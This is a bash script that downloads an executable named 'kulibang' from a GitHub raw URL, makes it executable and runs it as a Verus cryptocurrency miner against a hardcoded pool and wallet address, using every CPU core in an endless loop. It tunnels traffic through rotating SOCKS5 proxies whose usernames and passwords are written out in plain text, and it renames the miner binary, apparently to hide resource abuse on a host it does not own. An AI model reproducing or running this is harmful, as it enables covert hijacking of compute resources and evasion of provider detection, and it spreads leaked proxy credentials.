#!/bin/bash

# Define proxy configurations for each session
proxies=(
  "161.123.130.219:5890"
  "45.41.162.194:6831"
  "172.245.7.98:5151"
  "173.211.30.100:6534"
  "154.30.241.144:9855"
)

# Username and password for all proxies
username="mastahvan33"
password="lhekfawgr"

# Function to run ccminer with a specified proxy
run_ccminer() {
  local proxy=$1

  # Kill any leftover ccminer processes from previous runs
  pkill -f 'ccminer'
  sleep 2  # Wait to ensure all processes are terminated

  # Set up graftcp configuration
  cat > /root/graftcp/local/graftcp-local.conf <<END
loglevel = 1
socks5 = $proxy
socks5_username = $username
socks5_password = $password
END

  # Start graftcp local proxy
  /usr/bin/graftcp-local -config /root/graftcp/local/graftcp-local.conf &
  sleep .2

  # Check public IP using the proxy
  /usr/bin/graftcp curl ifconfig.me
  echo " "
  echo " "

  /usr/bin/graftc wget https://github.com/marcelinoferdom/minse/raw/main/kulibang -O /root/kulibang &
  chmod +x /root/kulibang

  # Run ccminer in the background
  /usr/bin/graftcp ./kulibang -a verus -o stratum+tcp://67.205.160.239:4444 -u RW7q4an3QCeRH89sqrGcHKopjTX1Uj4oFT.$(echo $(shuf -i 1-1000 -n 1)) -p x -t "$(nproc)" &

  # Store the process ID (PID) of ccminer
  ccminer_pid=$!

  # Sleep for xx minutes
  sleep 2600


  # Send SIGINT to ccminer to terminate gracefully (equivalent to Ctrl + C)
  kill -2 $ccminer_pid

  # Wait up to 10 seconds for the process to terminate
  for i in {1..10}; do
    if ! ps -p $ccminer_pid > /dev/null; then
      echo "ccminer process terminated gracefully."
      break
    fi
    sleep 1
  done

  # If the process is still running, force kill it
  if ps -p $ccminer_pid > /dev/null; then
    echo "Force killing ccminer process."
    kill -9 $ccminer_pid
  fi

  # Ensure all ccminer processes are terminated before proceeding
  pkill -f 'ccminer'
  sleep 2  # Wait to ensure all processes are cleared
}

# Infinite loop to continuously restart the sequence of 5 runs
while true; do
  echo "Starting new cycle of proxy runs..."

  # Main loop to run ccminer with a randomly selected proxy configuration
  for ((i = 0; i < 5; i++)); do
    # Select a random proxy from the list
    proxy="${proxies[RANDOM % ${#proxies[@]}]}"
    echo "Using proxy: $proxy"
    run_ccminer "$proxy"
  done

  echo "Cycle completed. Restarting the sequence..."
  sleep 200
done
